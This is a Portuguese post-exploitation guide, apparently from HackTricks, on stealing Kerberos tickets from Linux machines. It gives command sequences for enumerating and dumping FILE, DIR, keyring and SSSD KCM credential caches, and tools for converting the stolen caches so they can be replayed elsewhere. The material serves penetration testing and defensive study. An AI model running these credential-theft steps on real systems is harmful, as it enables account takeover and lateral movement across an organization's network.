# Coletando Tickets do Linux

{{#include ../../banners/hacktricks-training.md}}

### Armazenamento de Credenciais no Linux

Sistemas Linux armazenam credenciais em três tipos de caches, a saber: **Files** (no diretório `/tmp`), **Kernel Keyrings** (um segmento especial no kernel Linux) e **Process Memory** (para uso por processo único). A variável **default_ccache_name** em `/etc/krb5.conf` revela o tipo de armazenamento em uso, assumindo `FILE:/tmp/krb5cc_%{uid}` por padrão se não for especificada.

MIT/Heimdal também suportam backends adicionais que você deve procurar durante o post-exploitation:

- `DIR:/run/user/%{uid}/krb5cc` para caches multi-ticket baseados em diretório (padrão do systemd-logind em distros modernas).
- `KEYRING:persistent:%{uid}` ou `KEYRING:session` para armazenar ccaches dentro do kernel keyring (`KEY_SPEC_SESSION_KEYRING`, `KEY_SPEC_USER_KEYRING`, etc.).
- `KCM:%{uid}` quando o daemon Kerberos Cache Manager do SSSD (kcm) gerencia o armazenamento de tickets.
- `MEMORY:unique_id` para caches locais ao processo criados por bibliotecas (`gssproxy`, `sshd`, etc.).

Sempre que você conseguir um shell, extraia `KRB5CCNAME` de `/proc/<pid>/environ` dos daemons interessantes (p.ex. Apache, sshd, gssproxy) para saber qual backend de cache está sendo usado antes de começar a copiar arquivos.

### Enumerando Caches Ativos

Enumere os caches antes da extração para evitar perder tickets de alto valor:
```bash
$ klist -l            # list caches registered in the local keyring/KCM
$ klist -A            # show all ticket-granting tickets in the current cache
$ sudo keyctl get_persistent @u
$ sudo keyctl show `keyctl get_persistent @u`
$ sudo ls -al /tmp/krb5cc_* /run/user/*/krb5cc*
$ sudo find /proc -maxdepth 2 -name environ -exec sh -c 'tr "\0" "\n" < {} | grep -H KRB5' \;
```
A combinação de `klist`, `keyctl` e inspeção de `/proc` revela rapidamente se as credenciais vivem em arquivos, keyrings ou KCM, permitindo que você escolha a técnica de dumping correta.

### Extração de Credenciais

O artigo de 2017, [**Kerberos Credential Thievery (GNU/Linux)**](https://www.delaat.net/rp/2016-2017/p97/report.pdf), descreve métodos para extrair credenciais de keyrings e processos, enfatizando o mecanismo keyring do kernel Linux para gerenciar e armazenar chaves.

#### Visão geral da extração de keyrings

O **keyctl system call**, introduzido na versão do kernel 2.6.10, permite que aplicações em user space interajam com os keyrings do kernel. Credenciais em keyrings são armazenadas como componentes (default principal and credentials), distintos dos ccaches em arquivo, que também incluem um header. O **hercules.sh script** do artigo demonstra como extrair e reconstruir esses componentes em um ccache de arquivo utilizável para roubo de credenciais. Lembre-se que ccaches armazenados em keyring podem estar sob `KEYRING:persistent:%{uid}` (permanente entre logins), `KEYRING:session` (limpado no logout), ou até `KEY_SPEC_THREAD_KEYRING` para serviços que geram helper threads — então sempre enumere todos os tipos de keyring para o UID comprometido.

#### Fluxo manual de KEYRING

Você pode coletar manualmente tickets sem scripts auxiliares sempre que `default_ccache_name` estiver definido como `KEYRING:`:
```bash
$ KRING=$(keyctl get_persistent @u)
$ keyctl show $KRING                       # note the key serial of each ccache blob
$ keyctl pipe <serial> > /tmp/ccache_dump  # write raw blob to disk
$ KRB5CCNAME=/tmp/ccache_dump klist        # validate the stolen cache
```
Se múltiplos principals estiverem armazenados, repita a etapa `keyctl pipe` para cada serial, depois converta o ccache extraído para um formato compatível com Windows `.kirbi`/`.ccache` usando ferramentas como `kerbtool` (veja abaixo) ou `ticketConverter.py` antes de reproduzi-lo em outras máquinas.

#### Dicas rápidas para roubo de cache FILE/DIR

Quando credenciais são armazenadas como caches `FILE:` ou `DIR:`, operações simples de arquivo geralmente são suficientes:
```bash
$ sudo cp /tmp/krb5cc_1000 /tmp/websvc.ccache
$ sudo cp -r /run/user/1000/krb5cc /tmp/user1000_dircc
$ chmod 600 /tmp/*.ccache && chown attacker /tmp/*.ccache
```
Os caches de diretório contêm um arquivo por ticket de serviço, então compacte e exfiltre o diretório inteiro para manter os pares TGT + TGS intactos. Você também pode apontar suas ferramentas diretamente para o diretório: `KRB5CCNAME=DIR:/tmp/user1000_dircc impacket-psexec ...`.

#### Despejando caches gerenciados pelo KCM

O Kerberos Cache Manager do SSSD (kcm) faz proxy do armazenamento de credenciais através de `/var/run/kcm/kcmsock` (ou `/run/.heim_org.h5l.kcm-socket`) e persiste blobs criptografados dentro de `/var/lib/sss/secrets/` junto com `.secrets.mkey`. Fluxo de ataque:

1. Identifique o uso de KCM através de `/etc/krb5.conf` (`default_ccache_name = KCM:`) ou pela saída de `klist -l`.
2. Se você tem UID 0 ou faz parte do domínio SELinux `kcm`, enumere os caches usando a ferramenta de gerenciamento:
```bash
$ sudo kcm_ctl list                 # lists UID + cache IDs handled by kcm
$ sudo kcm_ctl get 1000 0 > /tmp/1000.kcm.ccache
$ KRB5CCNAME=/tmp/1000.kcm.ccache klist
```
3. Abordagem offline: copie `/var/lib/sss/secrets/secrets.ldb` junto com `/var/lib/sss/secrets/.secrets.mkey`, então execute `SSSDKCMExtractor` (ou PoCs semelhantes) para descriptografar e reassemblar ccaches sem tocar no socket ativo. Isso é especialmente útil em forense ou quando ACLs do socket bloqueiam você, mas o acesso ao disco é possível.

Como o daemon kcm respeita ACLs baseadas em UID aplicadas pelo SSSD, normalmente é necessário escalonamento de privilégios para root (ou comprometer `sssd_kcm`), mas uma vez obtido você pode extrair o TGT de cada usuário em segundos.

### Ticket Extraction Tooling

Automatizar os passos acima reduz erros e fornece material de tickets multiplataforma que você pode reproduzir usando ferramentas do Windows.

#### Tickey

Baseado nos princípios do **hercules.sh script**, a ferramenta [**tickey**](https://github.com/TarlogicSecurity/tickey) foi projetada especificamente para extrair tickets de keyrings, sendo executada via `/tmp/tickey -i`. Ela enumera os keyrings do kernel, reconstrói os ccaches serializados e grava arquivos de cache compatíveis com MIT que você pode alimentar imediatamente em `klist`, `impacket-*` ou em ferramentas como `kerberoast`.

#### Kerbtool

[**kerbtool**](https://github.com/jfjallid/kerbtool) é uma utilidade moderna em Go que roda nativamente no Linux e pode parsear, converter e solicitar tickets Kerberos. Dois casos de uso úteis ao coletar a partir de máquinas Linux:
```bash
# Convert a stolen MIT ccache into a .kirbi usable by Windows tooling
$ ./kerbtool --convert --in /tmp/websvc.ccache --out websvc.kirbi

# Use an extracted cache to request additional TGS tickets without touching the victim again
$ KRB5CCNAME=/tmp/websvc.ccache ./kerbtool --ask --spn cifs/fileserver.lab.local
```
Ter tanto tickey quanto kerbtool no seu implant host permite que você se mova sem problemas entre Linux, Windows, e cross-platform Kerberos attack chains.

## Referências

- [**https://www.tarlogic.com/en/blog/how-to-attack-kerberos/**](https://www.tarlogic.com/en/blog/how-to-attack-kerberos/)
- [**https://docs.pagure.org/sssd.sssd/design_pages/kcm.html**](https://docs.pagure.org/sssd.sssd/design_pages/kcm.html)
- [**https://github.com/jfjallid/kerbtool**](https://github.com/jfjallid/kerbtool)

{{#include ../../banners/hacktricks-training.md}}
